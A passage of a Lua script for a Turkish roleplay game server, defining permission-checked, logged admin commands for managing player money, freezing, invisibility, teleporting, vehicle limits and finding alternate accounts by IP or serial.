				local targetPlayer, targetPlayerName =
					exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
				if targetPlayer then
					if getElementData(targetPlayer, "logged") then
						if exports.mek_global:giveMoney(targetPlayer, amount) then
							outputChatBox(
								"[!]#FFFFFF "
									.. targetPlayerName
									.. " isimli oyuncuya ₺"
									.. exports.mek_global:formatMoney(amount)
									.. " verildi.",
								thePlayer,
								0,
								255,
								0,
								true
							)
							outputChatBox(
								"[!]#FFFFFF "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili size ₺"
									.. exports.mek_global:formatMoney(amount)
									.. " verdi.",
								targetPlayer,
								0,
								0,
								255,
								true
							)

							exports.mek_global:sendMessageToAdmins(
								"[ADM] "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetPlayerName
									.. " isimli oyuncuya ₺"
									.. exports.mek_global:formatMoney(amount)
									.. " verdi."
							)
							exports.mek_global:sendMessageToAdmins("[ADM] Sebep: " .. reason)

							exports.mek_logs:addLog(
								"givemoney",
								exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetPlayerName
									.. " isimli oyuncuya ₺"
									.. exports.mek_global:formatMoney(amount)
									.. " verdi.;Sebep: "
									.. reason
							)
						else
							outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
						end
					else
						outputChatBox(
							"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
							thePlayer,
							255,
							0,
							0,
							true
						)
					end
				end
			else
				outputChatBox("[!]#FFFFFF Birisine maksimum ₺10,000,000 verebilirsiniz.", thePlayer, 255, 0, 0, true)
			end
		else
			outputChatBox(
				"Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Miktar] [Sebep]",
				thePlayer,
				255,
				194,
				14
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("mekans535givemoney", giveMoney, false, false)

function setMoney(thePlayer, commandName, targetPlayer, amount, ...)
	if exports.mek_integration:isPlayerSeniorAdmin(thePlayer) then
		if targetPlayer and amount and tonumber(amount) and tonumber(amount) > 0 and (...) then
			amount = math.floor(amount)
			local reason = table.concat({ ... }, " ")
			if amount <= 10000000 then
				local targetPlayer, targetPlayerName =
					exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
				if targetPlayer then
					if getElementData(targetPlayer, "logged") then
						if exports.mek_global:setMoney(targetPlayer, amount) then
							outputChatBox(
								"[!]#FFFFFF "
									.. targetPlayerName
									.. " isimli oyuncunun parasını ₺"
									.. exports.mek_global:formatMoney(amount)
									.. " olarak ayarlandı.",
								thePlayer,
								0,
								255,
								0,
								true
							)
							outputChatBox(
								"[!]#FFFFFF "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili parasını ₺"
									.. exports.mek_global:formatMoney(amount)
									.. " olarak ayarlandı.",
								targetPlayer,
								0,
								0,
								255,
								true
							)

							exports.mek_global:sendMessageToAdmins(
								"[ADM] "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetPlayerName
									.. " isimli oyuncunun parasını ₺"
									.. exports.mek_global:formatMoney(amount)
									.. " olarak ayarladı."
							)
							exports.mek_global:sendMessageToAdmins("[ADM] Sebep: " .. reason)

							exports.mek_logs:addLog(
								"setmoney",
								exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetPlayerName
									.. " isimli oyuncunun parasını ₺"
									.. exports.mek_global:formatMoney(amount)
									.. " olarak ayarladı.;Sebep: "
									.. reason
							)
						else
							outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
						end
					else
						outputChatBox(
							"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
							thePlayer,
							255,
							0,
							0,
							true
						)
					end
				end
			else
				outputChatBox("[!]#FFFFFF Birisine maksimum ₺10,000,000 verebilirsiniz.", thePlayer, 255, 0, 0, true)
			end
		else
			outputChatBox(
				"Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Miktar] [Sebep]",
				thePlayer,
				255,
				194,
				14
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("mekans535setmoney", setMoney, false, false)

function takeMoney(thePlayer, commandName, targetPlayer, amount, ...)
	if exports.mek_integration:isPlayerSeniorAdmin(thePlayer) then
		if targetPlayer and amount and tonumber(amount) and tonumber(amount) > 0 and (...) then
			amount = math.floor(amount)
			local reason = table.concat({ ... }, " ")
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					if exports.mek_global:takeMoney(targetPlayer, amount) then
						outputChatBox(
							"[!]#FFFFFF "
								.. targetPlayerName
								.. " isimli oyuncunun parasından ₺"
								.. exports.mek_global:formatMoney(amount)
								.. " kesildi.",
							thePlayer,
							0,
							255,
							0,
							true
						)
						outputChatBox(
							"[!]#FFFFFF "
								.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili paranızdan ₺"
								.. exports.mek_global:formatMoney(amount)
								.. " kesti.",
							targetPlayer,
							0,
							0,
							255,
							true
						)

						exports.mek_global:sendMessageToAdmins(
							"[ADM] "
								.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili "
								.. targetPlayerName
								.. " isimli oyuncunun parasından ₺"
								.. exports.mek_global:formatMoney(amount)
								.. " kesti."
						)
						exports.mek_global:sendMessageToAdmins("[ADM] Sebep: " .. reason)

						exports.mek_logs:addLog(
							"takemoney",
							exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili "
								.. targetPlayerName
								.. " isimli oyuncunun parasından ₺"
								.. exports.mek_global:formatMoney(amount)
								.. " kesti.;Sebep: "
								.. reason
						)
					else
						outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
					end
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox(
				"Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Miktar] [Sebep]",
				thePlayer,
				255,
				194,
				14
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("takemoney", takeMoney, false, false)

function freezePlayer(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if targetPlayer then
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					if not isElementFrozen(targetPlayer) then
						local theVehicle = getPedOccupiedVehicle(targetPlayer)
						if theVehicle then
							setElementFrozen(theVehicle, true)
							setElementFrozen(targetPlayer, true)
							setElementData(targetPlayer, "frozen", true)
							toggleAllControls(targetPlayer, false, true, false)
						else
							detachElements(targetPlayer)
							toggleAllControls(targetPlayer, false, true, false)
							setElementFrozen(targetPlayer, true)
							setElementData(targetPlayer, "frozen", true)
							setPedWeaponSlot(targetPlayer, 0)
						end

						outputChatBox(
							"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncu donduruldu.",
							thePlayer,
							0,
							255,
							0,
							true
						)
						outputChatBox(
							"[!]#FFFFFF "
								.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili tarafından donduruldunuz.",
							targetPlayer,
							0,
							0,
							255,
							true
						)
						exports.mek_logs:addLog(
							"freeze",
							exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili "
								.. targetPlayerName
								.. " isimli oyuncuyu dondurdu."
						)
					else
						outputChatBox("[!]#FFFFFF Bu oyuncu zaten dondurulmuş.", thePlayer, 255, 0, 0, true)
					end
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("freeze", freezePlayer, false, false)

function unfreezePlayer(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if targetPlayer then
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					if isElementFrozen(targetPlayer) then
						local theVehicle = getPedOccupiedVehicle(targetPlayer)
						if theVehicle then
							setElementFrozen(theVehicle, false)
							setElementFrozen(targetPlayer, false)
							removeElementData(targetPlayer, "frozen")
							toggleAllControls(targetPlayer, true, true, true)
						else
							toggleAllControls(targetPlayer, true, true, true)
							setElementFrozen(targetPlayer, false)
							removeElementData(targetPlayer, "frozen")
							setPedWeaponSlot(targetPlayer, 0)
						end

						outputChatBox(
							"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncunun dondurulması açıldı.",
							thePlayer,
							0,
							255,
							0,
							true
						)
						outputChatBox(
							"[!]#FFFFFF "
								.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili tarafından dondurulmanız açıldı.",
							targetPlayer,
							0,
							0,
							255,
							true
						)
						exports.mek_logs:addLog(
							"unfreeze",
							exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili "
								.. targetPlayerName
								.. " isimli oyuncunun dondurulmasını açdı."
						)
					else
						outputChatBox("[!]#FFFFFF Bu oyuncu dondurulması yok.", thePlayer, 255, 0, 0, true)
					end
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("unfreeze", unfreezePlayer, false, false)

function disappearPlayer(thePlayer, commandName)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if getElementAlpha(thePlayer) < 255 then
			setElementAlpha(thePlayer, 255)
			outputChatBox("[!]#FFFFFF Görünmezlik kapatıldı.", thePlayer, 255, 0, 0, true)
			exports.mek_logs:addLog(
				"disappear",
				exports.mek_global:getPlayerFullAdminTitle(thePlayer) .. " isimli yetkili görünmezliğini kapattı."
			)
		else
			setElementAlpha(thePlayer, 0)
			outputChatBox("[!]#FFFFFF Görünmezlik açıldı.", thePlayer, 0, 255, 0, true)
			exports.mek_logs:addLog(
				"disappear",
				exports.mek_global:getPlayerFullAdminTitle(thePlayer) .. " isimli yetkili görünmezliğini açtı."
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("disappear", disappearPlayer, false, false)

function supervisePlayer(thePlayer, commandName)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if getElementAlpha(thePlayer) < 255 then
			setElementAlpha(thePlayer, 255)
			outputChatBox("[!]#FFFFFF Supervise kapatıldı.", thePlayer, 255, 0, 0, true)
			exports.mek_logs:addLog(
				"supervise",
				exports.mek_global:getPlayerFullAdminTitle(thePlayer) .. " isimli yetkili supervise kapattı."
			)
		else
			setElementAlpha(thePlayer, 100)
			outputChatBox("[!]#FFFFFF Supervise açıldı.", thePlayer, 0, 255, 0, true)
			exports.mek_logs:addLog(
				"supervise",
				exports.mek_global:getPlayerFullAdminTitle(thePlayer) .. " isimli yetkili supervise açtı."
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("supervise", supervisePlayer, false, false)

function sendPlayerToCity(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if targetPlayer then
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					local spawnPosition = exports.mek_global:getGameSettings().spawnPosition

					local theVehicle = getPedOccupiedVehicle(targetPlayer)
					if theVehicle then
						setElementPosition(theVehicle, 405.2216796875, -1539.5830078125, 32.2734375)
						setElementRotation(theVehicle, 0, 0, 220)
						setElementInterior(theVehicle, 0)
						setElementDimension(theVehicle, 0)
					else
						setElementPosition(targetPlayer, 405.2216796875, -1539.5830078125, 32.2734375)
						setElementRotation(targetPlayer, 0, 0, 220)
						setElementInterior(targetPlayer, 0)
						setElementDimension(targetPlayer, 0)
					end

					outputChatBox(
						"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncu şehre gönderildi.",
						thePlayer,
						0,
						255,
						0,
						true
					)
					outputChatBox(
						"[!]#FFFFFF "
							.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili sizi şehre gönderdi.",
						targetPlayer,
						0,
						0,
						255,
						true
					)
					exports.mek_logs:addLog(
						"sehre",
						exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili "
							.. targetPlayerName
							.. " isimli oyuncuyu şehre gönderildi."
					)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("sehre", sendPlayerToCity, false, false)

function distributeMoney(thePlayer, commandName, amount)
	if exports.mek_integration:isPlayerManager(thePlayer) then
		if amount and tonumber(amount) and tonumber(amount) > 0 then
			amount = math.floor(amount)
			if amount <= 5000000 then
				for _, player in ipairs(getElementsByType("player")) do
					if getElementData(player, "logged") then
						exports.mek_global:giveMoney(player, amount)
						exports.mek_infobox:addBox(
							player,
							"success",
							"Mekan Game'den herkese ₺" .. exports.mek_global:formatMoney(amount) .. " hediye!"
						)
					end
				end
				exports.mek_logs:addLog(
					"paradagit",
					exports.mek_global:getPlayerFullAdminTitle(thePlayer)
						.. " isimli yetkili ₺"
						.. exports.mek_global:formatMoney(amount)
						.. " dağıttı."
				)
			else
				outputChatBox(
					"[!]#FFFFFF Güvenlik sebebiyle en fazla ₺5,000,000 dağıtabilirsiniz.",
					thePlayer,
					255,
					0,
					0,
					true
				)
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Miktar]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("mekans535paradagit", distributeMoney, false, false)

local function showIPAlts(thePlayer, ip)
	local queryHandle = dbQuery(
		exports.mek_mysql:getConnection(),
		"SELECT `username`, `last_login` FROM `accounts` WHERE `ip` = ? ORDER BY `id` ASC",
		ip
	)
	local result = dbPoll(queryHandle, -1)

	if result then
		outputChatBox("IP Adresi: " .. ip, thePlayer, 255, 194, 14)
		for i, row in ipairs(result) do
			local lastLogin = row.last_login or "Asla"
			outputChatBox(
				"#" .. i .. ": " .. tostring(row.username) .. " (Son giriş: " .. lastLogin .. ")",
				thePlayer,
				255,
				255,
				0
			)
		end
		dbFree(queryHandle)
	else
		outputChatBox("[!]#FFFFFF Bu IP ile bağlantılı hesap bulunamadı.", thePlayer, 255, 0, 0, true)
	end
end

function findAltAccIP(thePlayer, commandName, ...)
	if exports.mek_integration:isPlayerGeneralAdmin(thePlayer) then
		if not (...) then
			outputChatBox("Kullanım: /" .. commandName .. " [Kullanıcı Adı / IP]", thePlayer, 255, 194, 14)
		else
			local targetPlayerName = table.concat({ ... }, "_")

			if string.match(targetPlayerName, "^%d+%.%d+%.%d+%.%d+$") then
				showIPAlts(thePlayer, targetPlayerName)
				return
			end

			local targetPlayer = exports.mek_global:findPlayerByPartialNick(nil, targetPlayerName)

			if not targetPlayer or not getElementData(targetPlayer, "logged") then
				local charQuery = dbPrepareString(
					exports.mek_mysql:getConnection(),
					"SELECT a.`ip` FROM `characters` c LEFT JOIN `accounts` a on c.`account_id`=a.`id` WHERE c.`name` = ?",
					targetPlayerName
				)
				local charHandle = dbQuery(exports.mek_mysql:getConnection(), charQuery)
				local charResult = dbPoll(charHandle, 0)

				if charResult and #charResult == 1 then
					local ip = charResult[1].ip or "0.0.0.0"
					dbFree(charHandle)
					showIPAlts(thePlayer, ip)
					return
				end
				dbFree(charHandle)

				targetPlayerName = table.concat({ ... }, " ")

				local accountQuery = dbPrepareString(
					exports.mek_mysql:getConnection(),
					"SELECT ip FROM accounts WHERE username = ?",
					targetPlayerName
				)
				local accountHandle = dbQuery(exports.mek_mysql:getConnection(), accountQuery)
				local accountResult = dbPoll(accountHandle, 0)

				if accountResult and #accountResult == 1 then
					local ip = accountResult[1].ip or "0.0.0.0"
					dbFree(accountHandle)
					showIPAlts(thePlayer, ip)
					return
				end
				dbFree(accountHandle)

				local ipQuery = dbPrepareString(
					exports.mek_mysql:getConnection(),
					"SELECT ip FROM accounts WHERE ip = ?",
					targetPlayerName
				)
				local ipHandle = dbQuery(exports.mek_mysql:getConnection(), ipQuery)
				local ipResult = dbPoll(ipHandle, 0)

				if ipResult and #ipResult >= 1 then
					local ip = ipResult[1].ip or "0.0.0.0"
					dbFree(ipHandle)
					showIPAlts(thePlayer, ip)
					return
				end
				dbFree(ipHandle)

				outputChatBox(
					"[!]#FFFFFF Oyuncu bulunamadı ve ya birden fazla oyuncu bulundu.",
					thePlayer,
					255,
					0,
					0,
					true
				)
			else
				showIPAlts(thePlayer, getPlayerIP(targetPlayer))
			end
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("findip", findAltAccIP, false, false)

local function showAlts(thePlayer, id)
	local nameQuery =
		dbPrepareString(exports.mek_mysql:getConnection(), "SELECT `username` FROM `accounts` WHERE `id` = ?", id)

	dbQuery(function(nameHandle)
		local nameResult = dbPoll(nameHandle, 0)
		dbFree(nameHandle)

		local username = (nameResult and nameResult[1] and nameResult[1].username) or "?"
		outputChatBox("Kullanıcı Adı: " .. username, thePlayer, 255, 194, 14)

		local charQuery = dbPrepareString(
			exports.mek_mysql:getConnection(),
			"SELECT `name`, `cked`, `last_login`, `hours_played` FROM `characters` WHERE `account_id` = ? ORDER BY `name` ASC",
			id
		)

		dbQuery(function(charHandle)
			local result = dbPoll(charHandle, 0)
			dbFree(charHandle)

			if not result or #result == 0 then
				outputChatBox("Bu hesaba ait karakter bulunamadı.", thePlayer, 255, 255, 0)
				return
			end

			for i, row in ipairs(result) do
				local r = 255
				if getPlayerFromName(row.name) then
					r = 0
				end

				local text = "#" .. i .. ": " .. (row.name:gsub("_", " "))
				if tonumber(row.cked) == 1 then
					text = text .. " (Öldü)"
				end

				if row.last_login then
					text = text .. " - " .. tostring(row.last_login)
				end

				local hours = tonumber(row.hours_played)
				if hours and hours > 0 then
					text = text .. " - " .. hours .. " saat"
				end

				outputChatBox(text, thePlayer, r, 255, 0)
			end
		end, exports.mek_mysql:getConnection(), charQuery)
	end, exports.mek_mysql:getConnection(), nameQuery)
end

function findAltChars(thePlayer, commandName, ...)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if not (...) then
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		else
			local targetPlayerName = table.concat({ ... }, "_")
			local targetPlayer = targetPlayerName == "*" and thePlayer
				or exports.mek_global:findPlayerByPartialNick(nil, targetPlayerName)

			if not targetPlayer or not getElementData(targetPlayer, "logged") then
				local query = dbPrepareString(
					exports.mek_mysql:getConnection(),
					"SELECT account_id FROM characters WHERE name = ?",
					targetPlayerName
				)
				dbQuery(function(queryHandle, ...)
					local result = dbPoll(queryHandle, 0)
					if result and #result == 1 then
						local id = tonumber(result[1].account_id) or 0
						showAlts(thePlayer, id)
					else
						local query2 = dbPrepareString(
							exports.mek_mysql:getConnection(),
							"SELECT id FROM accounts WHERE username = ?",
							table.concat({ ... }, " ")
						)
						dbQuery(function(queryHandle2)
							local result2 = dbPoll(queryHandle2, 0)
							if result2 and #result2 == 1 then
								local id = tonumber(result2[1].id) or 0
								showAlts(thePlayer, id)
							else
								outputChatBox(
									"[!]#FFFFFF Oyuncu bulunmadı veya birden fazla oyuncu bulundu.",
									thePlayer,
									255,
									0,
									0,
									true
								)
							end
							dbFree(queryHandle2)
						end, exports.mek_mysql:getConnection(), query2)
					end
					dbFree(queryHandle)
				end, { ... }, exports.mek_mysql:getConnection(), query)
			else
				local id = getElementData(targetPlayer, "account_id")
				if id then
					showAlts(thePlayer, id)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("findalts", findAltChars)

local function showSerialAlts(thePlayer, serial)
	local query = dbPrepareString(
		exports.mek_mysql:getConnection(),
		"SELECT `username`, `last_login` FROM `accounts` WHERE serial = ?",
		serial
	)
	dbQuery(function(queryHandle)
		local result = dbPoll(queryHandle, 0)
		if result then
			outputChatBox("Serial: " .. serial, thePlayer, 255, 194, 14)
			for i, row in ipairs(result) do
				local lastLogin = row.last_login or "Asla"
				outputChatBox(
					"#" .. i .. ": " .. tostring(row.username) .. " (Son giriş: " .. lastLogin .. ")",
					thePlayer,
					255,
					255,
					0
				)
			end
		end
		dbFree(queryHandle)
	end, exports.mek_mysql:getConnection(), query)
end

function findAltAccSerial(thePlayer, commandName, ...)
	if exports.mek_integration:isPlayerGeneralAdmin(thePlayer) then
		if not (...) then
			outputChatBox("Kullanım: /" .. commandName .. " [Kullanıcı Adı / Serial]", thePlayer, 255, 194, 14)
		else
			local targetPlayerName = table.concat({ ... }, "_")
			local targetPlayer = exports.mek_global:findPlayerByPartialNick(nil, targetPlayerName)

			if not targetPlayer then
				local query = dbPrepareString(
					exports.mek_mysql:getConnection(),
					"SELECT a.`serial` FROM `characters` c LEFT JOIN `accounts` a on c.`account_id`=a.`id` WHERE c.`name` = ?",
					targetPlayerName
				)
				dbQuery(function(queryHandle, ...)
					local result = dbPoll(queryHandle, 0)
					if result and #result == 1 then
						local serial = result[1].serial or "Bilinmiyor"
						showSerialAlts(thePlayer, serial)
					else
						local targetPlayerName = table.concat({ ... }, " ")

						local accountQuery = dbPrepareString(
							exports.mek_mysql:getConnection(),
							"SELECT `serial` FROM `accounts` WHERE `username` = ?",
							targetPlayerName
						)
						dbQuery(function(accountQueryHandle)
							local accountResult = dbPoll(accountQueryHandle, 0)
							if accountResult and #accountResult == 1 then
								local serial = accountResult[1].serial or "Bilinmiyor"
								showSerialAlts(thePlayer, serial)
							else
								local ipQuery = dbPrepareString(
									exports.mek_mysql:getConnection(),
									"SELECT `serial` FROM `accounts` WHERE `ip` = ?",
									targetPlayerName
								)
								dbQuery(function(ipQueryHandle)
									local ipResult = dbPoll(ipQueryHandle, 0)
									if ipResult and #ipResult >= 1 then
										local serial = ipResult[1].serial or "Bilinmiyor"
										showSerialAlts(thePlayer, serial)
									else
										local serialQuery = dbPrepareString(
											exports.mek_mysql:getConnection(),
											"SELECT `serial` FROM `accounts` WHERE `serial` = ?",
											targetPlayerName
										)
										dbQuery(function(serialQueryHandle)
											local serialResult = dbPoll(serialQueryHandle, 0)
											if serialResult and #serialResult >= 1 then
												local serial = serialResult[1].serial or "Bilinmiyor"
												showSerialAlts(thePlayer, serial)
											else
												outputChatBox(
													"[!]#FFFFFF Oyuncu bulunmadı veya birden fazla oyuncu bulundu.",
													thePlayer,
													255,
													0,
													0,
													true
												)
											end
										end, exports.mek_mysql:getConnection(), serialQuery)
									end
								end, exports.mek_mysql:getConnection(), ipQuery)
							end
						end, exports.mek_mysql:getConnection(), accountQuery)
					end
				end, { ... }, exports.mek_mysql:getConnection(), query)
			else
				showSerialAlts(thePlayer, getPlayerSerial(targetPlayer))
			end
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("findserial", findAltAccSerial, false, false)

function nudgePlayer(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if targetPlayer then
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					outputChatBox(
						"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncuya uyarıldı.",
						thePlayer,
						0,
						255,
						0,
						true
					)
					outputChatBox(
						"[!]#FFFFFF "
							.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili size uyardı.",
						targetPlayer,
						0,
						0,
						255,
						true
					)
					triggerClientEvent(targetPlayer, "playNudgeSound", targetPlayer)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("nudge", nudgePlayer)

function findCharacterID(thePlayer, commandName, charID)
	if exports.mek_integration:isPlayerAdmin1(thePlayer) then
		if charID and tonumber(charID) and tonumber(charID) > 0 then
			charID = tonumber(charID)
			dbQuery(function(queryHandle)
				local results, rows = dbPoll(queryHandle, 0)
				if rows > 0 and results[1] then
					local charAccountID = results[1].account_id
					dbQuery(
						function(accountQuery)
							local accountResults, accountRows = dbPoll(accountQuery, 0)
							if accountRows > 0 and accountResults[1] then
								local accountName = accountResults[1].username
								outputChatBox(
									"[!]#FFFFFF Bulundu: "
										.. results[1].name:gsub("_", " ")
										.. " ("
										.. accountName
										.. ")",
									thePlayer,
									0,
									255,
									0,
									true
								)
							else
								outputChatBox("[!]#FFFFFF Böyle bir hesap bulunamadı.", thePlayer, 255, 0, 0, true)
							end
						end,
						exports.mek_mysql:getConnection(),
						"SELECT username FROM accounts WHERE id = ? LIMIT 1",
						charAccountID
					)
				else
					outputChatBox("[!]#FFFFFF Böyle bir karakter bulunamadı.", thePlayer, 255, 0, 0, true)
				end
			end, exports.mek_mysql:getConnection(), "SELECT * FROM characters WHERE id = ? LIMIT 1", charID)
		else
			outputChatBox("Kullanım: /" .. commandName .. " [ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("findcharid", findCharacterID, false, false)
addCommandHandler("cid", findCharacterID, false, false)
addCommandHandler("findcid", findCharacterID, false, false)
addCommandHandler("maskebul", findCharacterID, false, false)

function setVehicleLimit(thePlayer, commandName, targetPlayer, limit)
	if exports.mek_integration:isPlayerServerManager(thePlayer) then
		if targetPlayer and limit and tonumber(limit) then
			limit = math.floor(tonumber(limit))
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					setElementData(targetPlayer, "max_vehicles", limit)
					dbExec(
						exports.mek_mysql:getConnection(),
						"UPDATE characters SET max_vehicles = ? WHERE id = ?",
						limit,
						getElementData(targetPlayer, "dbid")
					)
					outputChatBox(
						"[!]#FFFFFF "
							.. targetPlayerName
							.. " isimli oyuncunun araç limiti ["
							.. limit
							.. "] olarak değiştirdi.",
						thePlayer,
						0,
						255,
						0,
						true
					)
					outputChatBox(
						"[!]#FFFFFF "
							.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili araç limitinizi ["
							.. limit
							.. "] olarak değitirdi.",
						targetPlayer,
						0,
						0,
						255,
						true
					)
					exports.mek_logs:addLog(
						"setvehlimit",
						exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili "
							.. targetPlayerName
							.. " isimli oyuncunun araç limiti ["
							.. limit
							.. "] olarak değiştirdi."
					)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Limit]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("setvehlimit", setVehicleLimit, false, false)

function setInteriorLimit(thePlayer, commandName, targetPlayer, limit)
	if exports.mek_integration:isPlayerServerManager(thePlayer) then
		if targetPlayer and limit and tonumber(limit) then
			limit = math.floor(tonumber(limit))
